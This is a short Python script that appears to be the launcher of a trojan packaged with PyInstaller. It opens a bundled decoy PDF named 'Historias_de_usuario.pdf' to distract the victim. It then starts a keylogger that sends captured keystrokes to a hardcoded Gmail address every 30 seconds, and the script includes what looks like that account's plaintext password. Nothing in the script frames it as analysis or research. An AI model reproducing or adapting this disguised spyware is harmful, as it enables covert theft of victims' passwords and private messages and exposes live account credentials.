import subprocess
import sys
import keylogger

file_name = sys._MEIPASS + '\Historias_de_usuario.pdf'
subprocess.Popen(file_name, shell= True)

keylogger = keylogger.Keylogger(30, 'rchbrry00@gmail.com', 'l$5EUhffvgsC')
keylogger.start()